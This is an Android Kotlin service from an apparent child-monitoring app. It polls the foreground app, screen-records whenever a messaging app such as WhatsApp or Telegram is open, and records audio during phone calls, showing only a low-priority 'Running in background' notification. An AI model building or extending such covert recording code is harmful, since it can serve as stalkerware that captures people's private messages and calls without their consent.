package com.example.childmonitoringapp.service

import android.R
import android.app.Notification
import android.app.NotificationChannel
import android.app.NotificationManager
import android.app.Service
import android.content.Context
import android.content.Intent
import android.media.MediaRecorder
import android.media.projection.MediaProjection
import android.media.projection.MediaProjectionManager
import android.os.Build
import android.os.Bundle
import android.os.Handler
import android.os.IBinder
import android.os.Looper
import android.os.Parcelable
import android.util.Log
import androidx.core.app.NotificationCompat
import android.content.pm.PackageManager
import com.example.childmonitoringapp.Constants
import java.io.File

class MonitoringService : Service() {
    private val CHANNEL_ID = "MonitoringChannel"
    private val NOTIFICATION_ID = 1
    private lateinit var mediaProjectionManager: MediaProjectionManager
    private var mediaProjection: MediaProjection? = null
    private var mediaRecorder: MediaRecorder? = null
    private val handler = Handler(Looper.getMainLooper())
    private val targetApps = setOf(
        "com.google.android.apps.messaging",
        "com.whatsapp",
        "com.zalo.zalo",
        "com.facebook.orca",
        "org.telegram.messenger"
    )

    override fun onCreate() {
        super.onCreate()
        mediaProjectionManager = getSystemService(Context.MEDIA_PROJECTION_SERVICE) as MediaProjectionManager
        createNotificationChannel()
        startForeground(NOTIFICATION_ID, createNotification())
        startMonitoring()
        Log.d("Monitoring", "Service started")
    }

    private fun createNotificationChannel() {
        val channel = NotificationChannel(CHANNEL_ID, "Monitoring Service", NotificationManager.IMPORTANCE_LOW)
        getSystemService(NotificationManager::class.java)?.createNotificationChannel(channel)
    }

    private fun createNotification(): Notification {
        return NotificationCompat.Builder(this, CHANNEL_ID)
            .setContentTitle("Monitoring")
            .setContentText("Running in background")
            .setSmallIcon(android.R.drawable.ic_menu_info_details)
            .setPriority(NotificationCompat.PRIORITY_LOW)
            .build()
    }

    private fun startMonitoring() {
        handler.post(object : Runnable {
            override fun run() {
                val currentApp = getForegroundApp()
                Log.d("Monitoring", "Current app: $currentApp")

                if (currentApp != null && targetApps.contains(currentApp)) {
                    startScreenRecording()
                } else if (isPhoneCallActive()) {
                    startCallRecording()
                } else {
                    stopRecording()
                }

                handler.postDelayed(this, 5000) // Kiểm tra mỗi 5 giây
            }
        })
    }

    private fun getForegroundApp(): String? {
        val am = getSystemService(Context.ACTIVITY_SERVICE) as android.app.ActivityManager
        val processes = am.runningAppProcesses
        if (processes == null) {
            Log.e("Monitoring", "RunningAppProcesses is null, check permission")
            return null
        }
        val foreground = processes.firstOrNull { it.importance == android.app.ActivityManager.RunningAppProcessInfo.IMPORTANCE_FOREGROUND }
        val appName = foreground?.processName
        Log.d("Monitoring", "Foreground app detected: $appName")
        return appName
    }
    private fun isPhoneCallActive(): Boolean {
        val tm = getSystemService(Context.TELEPHONY_SERVICE) as android.telephony.TelephonyManager
        return tm.callState != android.telephony.TelephonyManager.CALL_STATE_IDLE
    }

    private fun startScreenRecording() {
        if (mediaRecorder == null) {
            val file = File(getExternalFilesDir(null), "screen_record_${System.currentTimeMillis()}.mp4")
            Log.d("Monitoring", "Saving screen to: ${file.absolutePath}")
            mediaRecorder = MediaRecorder().apply {
                setVideoSource(MediaRecorder.VideoSource.SURFACE)
                setOutputFormat(MediaRecorder.OutputFormat.MPEG_4)
                setVideoEncoder(MediaRecorder.VideoEncoder.H264)
                setOutputFile(file.absolutePath)
                prepare()
            }
            mediaProjection?.let {
                mediaRecorder?.start()
                Log.d("Monitoring", "Screen recording started")
            } ?: Log.d("Monitoring", "MediaProjection not set")
        }
    }

    private fun startCallRecording() {
        if (mediaRecorder == null) {
            val file = File(getExternalFilesDir(null), "call_record_${System.currentTimeMillis()}.mp4")
            Log.d("Monitoring", "Saving call to: ${file.absolutePath}")
            mediaRecorder = MediaRecorder().apply {
                setAudioSource(if (Build.VERSION.SDK_INT < 29) MediaRecorder.AudioSource.VOICE_CALL else MediaRecorder.AudioSource.MIC)
                setOutputFormat(MediaRecorder.OutputFormat.MPEG_4)
                setAudioEncoder(MediaRecorder.AudioEncoder.AAC)
                setOutputFile(file.absolutePath)
                try {
                    prepare()
                    start()
                    Log.d("Monitoring", "Call recording started")
                } catch (e: Exception) {
                    Log.e("Monitoring", "Failed to start call recording: ${e.message}")
                    stopRecording()
                }
            }
        }
    }

    private fun stopRecording() {
        mediaRecorder?.apply {
            try {
                stop()
                reset()
            } catch (e: Exception) {
                Log.e("Monitoring", "Error stopping recording: ${e.message}")
            }
        }
        mediaRecorder = null
        Log.d("Monitoring", "Recording stopped")
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        intent?.extras?.let { bundle ->
            bundle.getParcelable<Parcelable>(Constants.EXTRA_PROJECTION_DATA)?.let { parcelable ->
                mediaProjection = parcelable as? MediaProjection
                if (mediaProjection == null) {
                    Log.e("Monitoring", "MediaProjection is null, check SetupActivity")
                } else {
                    Log.d("Monitoring", "MediaProjection initialized successfully")
                }
            } ?: run {
                Log.e("Monitoring", "No Parcelable data found in Intent")
            }
        } ?: run {
            Log.e("Monitoring", "Intent or extras is null")
        }
        return START_STICKY
    }

    override fun onDestroy() {
        super.onDestroy()
        stopRecording()
        mediaProjection?.stop()
    }

    override fun onBind(intent: Intent?): IBinder? = null
}